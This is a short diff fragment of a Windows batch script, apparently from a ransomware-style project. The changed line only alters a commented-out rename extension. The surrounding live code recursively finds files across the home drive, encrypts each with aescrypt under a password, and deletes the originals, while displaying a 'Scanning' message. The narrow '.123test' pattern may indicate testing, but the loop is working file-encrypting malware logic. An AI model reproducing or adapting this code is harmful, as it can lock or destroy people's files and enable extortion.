@@ -9,7 +9,7 @@ echo Scanning. . . .
 REM Change file extension *.123test for *.doc
 FOR /R "%homedrive%\" %%X in (*.123test) DO (
 REM echo %%X >> %homedrive%\Original.txt SafeMode
-REM Rename "%%X" "%%~nX.crypt" >NUL 2>&1 SafeMode   
+REM Rename "%%X" "%%~nX.bak" >NUL 2>&1 SafeMode   
 aescrypt -e -p %pass% "%%X"
 del "%%X"
 )
